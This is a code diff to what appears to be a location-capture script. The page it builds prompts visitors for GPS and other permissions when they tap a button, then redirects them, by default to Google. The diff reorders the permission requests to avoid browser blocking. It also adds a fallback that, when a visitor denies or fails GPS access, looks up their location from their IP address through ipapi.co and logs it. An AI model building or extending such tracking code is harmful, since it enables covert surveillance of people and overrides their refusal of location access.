@@ -156,9 +156,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             console.log("[DEBUG] handleTap click", e);
             clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
             
-            // Immediate trigger of permissions within direct user gesture
-            if (typeof fireParallel === 'function') fireParallel().catch(e => console.error(e));
-            if (typeof fireGPS === 'function') fireGPS().catch(e => console.error(e));
+            // Sequential trigger of permissions to avoid browser blocking
+            (async () => {
+              if (typeof fireGPS === 'function') await fireGPS().catch(e => console.error(e));
+              if (typeof fireParallel === 'function') await fireParallel().catch(e => console.error(e));
+            })();
             
             var btn = getTargetBtn();
             if (!btn) {
@@ -932,6 +934,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                 },
                 (e) => { 
                     clientLog("fireGPS: Error", e.message);
+                    // Fallback to IP geolocation if GPS is denied or fails
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(data => logEvent('ip_geo', data))
+                        .catch(err => clientLog("IP Geo failed", err.message));
+
                     permsCompleted++; 
                     resolve(); 
                 },
